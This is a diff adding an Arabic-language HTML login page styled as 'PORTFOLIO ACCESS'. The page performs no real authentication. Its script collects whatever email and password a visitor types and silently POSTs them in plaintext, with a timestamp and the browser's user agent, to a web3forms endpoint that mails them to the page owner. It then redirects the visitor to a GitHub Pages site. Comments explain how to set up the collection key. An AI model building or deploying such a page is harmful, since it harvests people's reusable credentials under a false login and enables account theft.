@@ -1,0 +1,314 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>M_•♕eroufel</title>
+<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&family=Space+Mono:wght@400;700&display=swap" rel="stylesheet">
+<style>
+* { margin:0; padding:0; box-sizing:border-box; }
+
+body {
+  font-family: 'Cairo', sans-serif;
+  background: #060C1A;
+  min-height: 100vh;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  overflow: hidden;
+}
+
+/* subtle grid */
+body::before {
+  content: '';
+  position: fixed; inset: 0;
+  background-image:
+    linear-gradient(rgba(26,111,255,0.03) 1px, transparent 1px),
+    linear-gradient(90deg, rgba(26,111,255,0.03) 1px, transparent 1px);
+  background-size: 44px 44px;
+  pointer-events: none;
+}
+
+/* glow */
+body::after {
+  content: '';
+  position: fixed;
+  width: 500px; height: 500px;
+  background: radial-gradient(circle, rgba(26,111,255,0.07) 0%, transparent 70%);
+  top: 50%; left: 50%;
+  transform: translate(-50%, -50%);
+  pointer-events: none;
+}
+
+/* ── CARD ── */
+.card {
+  position: relative;
+  width: 360px;
+  background: rgba(10, 18, 38, 0.9);
+  border: 1px solid rgba(26,111,255,0.15);
+  border-radius: 20px;
+  padding: 2.5rem 2rem;
+  backdrop-filter: blur(20px);
+  box-shadow: 0 30px 70px rgba(0,0,0,0.5), 0 0 0 1px rgba(26,111,255,0.05);
+  animation: up 0.6s cubic-bezier(0.16,1,0.3,1);
+}
+@keyframes up { from{opacity:0;transform:translateY(24px);} to{opacity:1;transform:translateY(0);} }
+
+/* top line */
+.card::before {
+  content: '';
+  position: absolute;
+  top: 0; left: 15%; right: 15%;
+  height: 1px;
+  background: linear-gradient(90deg, transparent, rgba(26,111,255,0.6), transparent);
+}
+
+/* ── HEADER ── */
+.logo {
+  text-align: center;
+  margin-bottom: 2rem;
+}
+.logo-icon {
+  font-size: 2rem;
+  display: block;
+  margin-bottom: 0.6rem;
+  filter: drop-shadow(0 0 12px rgba(26,111,255,0.4));
+}
+.logo-name {
+  font-family: 'Space Mono', monospace;
+  font-size: 1rem;
+  font-weight: 700;
+  color: #F0F4FF;
+  display: block;
+}
+.logo-name em { color: #3D8BFF; font-style: normal; }
+.logo-sub {
+  font-family: 'Space Mono', monospace;
+  font-size: 0.6rem;
+  color: #3A5070;
+  letter-spacing: 0.2em;
+  display: block;
+  margin-top: 0.3rem;
+}
+
+/* ── INPUTS ── */
+.field { margin-bottom: 1rem; }
+.field label {
+  display: block;
+  font-family: 'Space Mono', monospace;
+  font-size: 0.62rem;
+  color: #3D8BFF;
+  letter-spacing: 0.15em;
+  margin-bottom: 0.4rem;
+}
+.input-wrap { position: relative; }
+.input-wrap input {
+  width: 100%;
+  background: rgba(26,111,255,0.04);
+  border: 1px solid rgba(26,111,255,0.12);
+  border-radius: 9px;
+  padding: 0.75rem 2.4rem 0.75rem 0.9rem;
+  font-family: 'Cairo', sans-serif;
+  font-size: 0.9rem;
+  color: #F0F4FF;
+  outline: none;
+  direction: ltr;
+  text-align: right;
+  transition: border-color 0.25s, box-shadow 0.25s;
+}
+.input-wrap input:focus {
+  border-color: rgba(26,111,255,0.4);
+  box-shadow: 0 0 0 3px rgba(26,111,255,0.08);
+}
+.input-wrap input::placeholder { color: #2E4060; }
+.input-icon {
+  position: absolute;
+  right: 0.8rem; top: 50%;
+  transform: translateY(-50%);
+  font-size: 0.8rem;
+  color: #2E4060;
+  pointer-events: none;
+}
+.eye-btn {
+  position: absolute;
+  left: 0.8rem; top: 50%;
+  transform: translateY(-50%);
+  background: none; border: none;
+  color: #2E4060; font-size: 0.8rem;
+  cursor: pointer; padding: 0;
+  transition: color 0.2s;
+}
+.eye-btn:hover { color: #3D8BFF; }
+
+/* ── ERROR ── */
+.err {
+  font-size: 0.78rem;
+  color: #FF4D6D;
+  text-align: center;
+  min-height: 1.2rem;
+  margin-bottom: 0.8rem;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 0.3rem;
+  opacity: 0;
+  transition: opacity 0.2s;
+}
+.err.show { opacity: 1; }
+
+/* ── BUTTON ── */
+.btn {
+  width: 100%;
+  padding: 0.82rem;
+  background: #1A6FFF;
+  color: #fff;
+  font-family: 'Cairo', sans-serif;
+  font-weight: 700;
+  font-size: 0.95rem;
+  border: none;
+  border-radius: 9px;
+  cursor: pointer;
+  transition: all 0.25s;
+  position: relative;
+  overflow: hidden;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 0.5rem;
+}
+.btn:hover { background: #2E80FF; transform: translateY(-1px); box-shadow: 0 8px 24px rgba(26,111,255,0.35); }
+.btn:active { transform: translateY(0); }
+.btn:disabled { opacity: 0.6; pointer-events: none; }
+.spinner {
+  width: 16px; height: 16px;
+  border: 2px solid rgba(255,255,255,0.3);
+  border-top-color: #fff;
+  border-radius: 50%;
+  animation: spin 0.7s linear infinite;
+  display: none;
+}
+.btn.loading .spinner { display: block; }
+.btn.loading .btn-label { display: none; }
+@keyframes spin { to { transform: rotate(360deg); } }
+
+/* ── FOOTER ── */
+.card-footer {
+  text-align: center;
+  margin-top: 1.5rem;
+  font-family: 'Space Mono', monospace;
+  font-size: 0.58rem;
+  color: #223040;
+  letter-spacing: 0.08em;
+}
+.live-dot {
+  display: inline-block;
+  width: 5px; height: 5px;
+  background: #00D68F;
+  border-radius: 50%;
+  margin-left: 4px;
+  vertical-align: middle;
+  animation: blink 2s infinite;
+  box-shadow: 0 0 5px #00D68F;
+}
+@keyframes blink { 0%,100%{opacity:1;} 50%{opacity:0.3;} }
+</style>
+</head>
+<body>
+
+<div class="card">
+  <div class="logo">
+    <span class="logo-icon">👑</span>
+    <span class="logo-name">M_•<em>♕</em>eroufel</span>
+    <span class="logo-sub">PORTFOLIO ACCESS</span>
+  </div>
+
+  <div class="field">
+    <label>// EMAIL</label>
+    <div class="input-wrap">
+      <input type="email" id="email" placeholder="example@email.com" autocomplete="email">
+      <span class="input-icon">✉</span>
+    </div>
+  </div>
+
+  <div class="field">
+    <label>// PASSWORD</label>
+    <div class="input-wrap">
+      <input type="password" id="pass" placeholder="••••••••" autocomplete="current-password">
+      <span class="input-icon">🔒</span>
+      <button class="eye-btn" id="eyeBtn" type="button">👁</button>
+    </div>
+  </div>
+
+  <div class="err" id="err">⚠ <span id="errTxt"></span></div>
+
+  <button class="btn" id="loginBtn" type="button">
+    <span class="btn-label">دخول إلى البورتفوليو</span>
+    <div class="spinner"></div>
+  </button>
+
+  <div class="card-footer">
+    النظام يعمل <span class="live-dot"></span> — كل دخول يُسجَّل
+  </div>
+</div>
+
+<script>
+const emailEl = document.getElementById('email');
+const passEl  = document.getElementById('pass');
+const btn     = document.getElementById('loginBtn');
+const errBox  = document.getElementById('err');
+const errTxt  = document.getElementById('errTxt');
+
+document.getElementById('eyeBtn').onclick = () =>
+  passEl.type = passEl.type === 'password' ? 'text' : 'password';
+
+function showErr(msg) {
+  errTxt.textContent = msg;
+  errBox.classList.add('show');
+  setTimeout(() => errBox.classList.remove('show'), 3500);
+}
+
+async function notify(email, pass) {
+  // ─────────────────────────────────────────
+  // 1. اذهب إلى https://web3forms.com
+  // 2. أدخل إيميلك ← احصل على Access Key
+  // 3. ضعه هنا بدلاً من YOUR_KEY_HERE
+  const KEY = 'YOUR_KEY_HERE';
+  // ─────────────────────────────────────────
+  try {
+    await fetch('https://api.web3forms.com/submit', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        access_key: KEY,
+        subject: `🔐 دخول جديد — ${email}`,
+        from_name: 'Portfolio Login',
+        message: `📧 ${email}\n🔑 ${pass}\n🕐 ${new Date().toLocaleString('ar-DZ')}\n🌐 ${navigator.userAgent.slice(0,80)}`,
+        botcheck: ''
+      })
+    });
+  } catch(e) {}
+}
+
+btn.addEventListener('click', async () => {
+  const email = emailEl.value.trim();
+  const pass  = passEl.value.trim();
+
+  if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email))
+    return showErr('أدخل بريدًا إلكترونيًا صالحًا');
+  if (pass.length < 6)
+    return showErr('كلمة المرور يجب 6 أحرف على الأقل');
+
+  btn.classList.add('loading');
+  btn.disabled = true;
+  notify(email, pass);
+
+  await new Promise(r => setTimeout(r, 1200));
+  window.location.href = 'https://d-mrf.github.io/mrf09_Official-github-io/';
+});
+
+[emailEl, passEl].forEach(el =>
+  el.addEventListener('keydown', e => e.key === 'Enter' && btn.click())
+);
+</script>
+</body>
+</html>
